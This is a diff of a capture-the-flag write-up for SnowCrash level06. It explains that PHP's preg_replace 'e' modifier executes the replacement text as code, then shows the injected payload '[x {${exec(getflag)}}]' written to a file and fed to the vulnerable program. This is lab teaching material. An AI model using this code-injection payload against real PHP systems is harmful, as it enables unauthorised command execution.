@@ -14,9 +14,11 @@ function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\]
 $r = x($argv[1], $argv[2]); print $r;
 ?>
 
-Preg_replace has a regex modifier ‘e’ who will cause php to execute the replacement value as php code. So we will use that to achieve our goal.
-
+********************************************************************************
+Preg_replace has a regex modifier ‘e’ who will cause php to execute the
+replacement value as php code. So we will use that to achieve our goal.
 The pattern to respect is “[x (.*)]” ==>  “[x {${exec(getflag)}}]”.
+********************************************************************************
 
 level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/exploit
 level06@SnowCrash:~$ ./level06 /tmp/exploit
